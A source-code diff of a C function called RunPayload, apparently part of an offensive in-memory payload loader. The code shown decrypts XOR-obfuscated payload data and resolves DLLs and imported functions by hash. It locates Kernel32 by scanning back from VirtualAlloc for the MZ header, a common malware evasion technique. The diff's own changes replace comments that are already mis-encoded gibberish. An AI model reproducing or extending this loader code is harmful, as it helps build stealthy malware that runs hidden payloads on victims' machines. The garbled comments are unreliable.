@@ -11,6 +11,7 @@ PDWORD_PTR impFuncAddrList = NULL;
 __declspec(noinline) int GetHash(char* string, int length);
 __declspec(noinline) void XorData(PBYTE data, int dataLength, BYTE xor1, BYTE xor2);
 
+// ‰øùËØÅ RunPayload Âú® .func ÁΩÆÈ°∂
 #pragma code_seg(".func")
 
 int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPara, int commandParaLen, char*& outputData, int& outputDataLen, PVOID specialParaList[]) {
@@ -35,7 +36,7 @@ int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPa
     PBYTE pRdata = pBofFuncOffsetMap + bofFuncOffsetMapLen;
     PBYTE pObfCode = pRdata + rdataLen;
 
-    // ≤È’“ bofFunc ∆´“∆
+    //      bofFunc ∆´  
     int ifFind = 0;
     WORD bofFuncOffset;
     XorData(pBofFuncOffsetMap, bofFuncOffsetMapLen, xor1, xor2);
@@ -51,7 +52,7 @@ int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPa
         return 0;
     }
 
-    // ÷ÿ∂®Œª
+    //  ÿ∂ Œª
     if (needReloc == 0x01) {
         if (dllHashList == NULL) {
             dllHashList = (int*)malloc(1000 * sizeof(int));
@@ -101,7 +102,7 @@ int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPa
             }
             // DLL
             else {
-                // ªÒ»° DLL ª˘÷∑
+                //   »° DLL   ÷∑
                 DWORD_PTR dllBase = 0;
                 for (int i = 0; i < dllNum; i++) {
                     if (dllHashList[i] == dllHash) {
@@ -112,7 +113,7 @@ int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPa
                 if (!dllBase) {
                     if (dllHash == -1499897628) { // Kernel32
                         PBYTE pVirtualAlloc = (PBYTE)VirtualAlloc;
-                        for (; *(PDWORD)pVirtualAlloc != 0x00905A4D; pVirtualAlloc--); // ≤È’“ MZ
+                        for (; *(PDWORD)pVirtualAlloc != 0x00905A4D; pVirtualAlloc--); //      MZ
                         dllBase = (DWORD_PTR)pVirtualAlloc;
                     }
                     else {
@@ -126,7 +127,7 @@ int RunPayload(PBYTE pPayload, int payloadSize, int bofFuncHash, char* commandPa
                     dllBaseList[dllNum] = dllBase;
                     dllNum++;
                 }
-                // ªÒ»°µº»Î∫Ø ˝÷∏’Î
+                //   »°   Î∫Ø  ÷∏  
                 PDWORD_PTR pImpFunc = NULL;
                 for (int i = 0; i < impFuncNum; i++) {
                     if (impFuncHashList[i] == impFuncHash) {
